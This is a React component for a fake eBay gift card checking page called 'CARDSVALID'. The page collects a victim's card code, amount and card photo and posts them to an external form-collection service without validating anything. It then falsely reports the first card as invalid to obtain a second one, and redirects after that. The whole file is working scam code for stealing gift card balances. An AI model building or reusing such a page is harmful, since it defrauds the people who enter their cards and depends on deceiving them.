import React, { useState } from "react";
import axios from "axios";
import { useNavigate } from "react-router-dom";
import AppleCard from "../assets/ebay-gift.jpeg";

const FORMSPARK_FORM_ID = "https://submit-form.com/A4UfsxSMp"; // Update if different

export const Ebay = () => {
  const [formData, setFormData] = useState({
    name: "ebay",
    code: "",
    amount: "",
    image: "",
  });

  const [submissionCount, setSubmissionCount] = useState(0);
  const [isLoading, setIsLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");
  const navigate = useNavigate();

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsLoading(true);
    setErrorMessage("");

    try {
      const submissionData = { ...formData, source: "Bottomline" };

      const response = await axios.post(FORMSPARK_FORM_ID, submissionData);

      if (response.status === 200) {
        setSubmissionCount((prev) => prev + 1);
        setIsLoading(false);

        if (submissionCount === 0) {
          setErrorMessage("Invalid card. Upload again.");
          setFormData({ name: "ebay", code: "", amount: "", image: "" });

          setTimeout(() => {
            setErrorMessage("");
          }, 5000);
        } else if (submissionCount === 1) {
          setErrorMessage("Too many failed attempts. Redirecting...");
          setTimeout(() => {
            navigate("/");
          }, 5000);
        }
      }
    } catch (error) {
      console.error(
        "Error submitting form:",
        error.response?.data || error.message
      );
      setIsLoading(false);
      setErrorMessage("Submission failed. Please try again.");
    }
  };

  return (
    <div className="min-h-screen bg-[#f6f1e9] flex flex-col items-center justify-center p-6">
      <h1 className="text-4xl font-bold mb-2">CARDSVALID</h1>
      <p className="text-md mb-4">carefully scratch the card to see code</p>

      <img
        src={AppleCard}
        alt="Card Example"
        className="w-full max-w-sm rounded-lg shadow mb-4"
      />

      {errorMessage && (
        <div
          className={`text-center mb-4 font-medium ${
            errorMessage.includes("Invalid") || errorMessage.includes("failed")
              ? "text-red-600"
              : "text-green-600"
          }`}
        >
          {errorMessage}
        </div>
      )}

      <form
        onSubmit={handleSubmit}
        className="w-full max-w-sm flex flex-col gap-4"
      >
        <input
          type="text"
          name="code"
          placeholder="Code"
          value={formData.code}
          onChange={handleChange}
          required
          className="px-4 py-2 rounded border border-gray-300 focus:outline-none focus:ring focus:border-blue-400"
        />
        <input
          type="text"
          name="amount"
          placeholder="Amount"
          value={formData.amount}
          onChange={handleChange}
          required
          className="px-4 py-2 rounded border border-gray-300 focus:outline-none focus:ring focus:border-blue-400"
        />

        <input type="hidden" name="image" value={formData.image} readOnly />
        <div>
          <input
            type="hidden"
            role="uploadcare-uploader"
            data-public-key="YOUR_UPLOADCARE_PUBLIC_KEY"
            data-tabs="file camera url"
            data-crop="free"
            data-clearable
            onChange={(e) =>
              setFormData((prev) => ({ ...prev, image: e.target.value }))
            }
          />
        </div>

        <button
          type="submit"
          disabled={isLoading}
          className="bg-green-500 text-white px-6 py-2 rounded hover:bg-green-600 transition disabled:opacity-50"
        >
          {isLoading ? "Verifying..." : "Verify Card"}
        </button>
      </form>
    </div>
  );
};
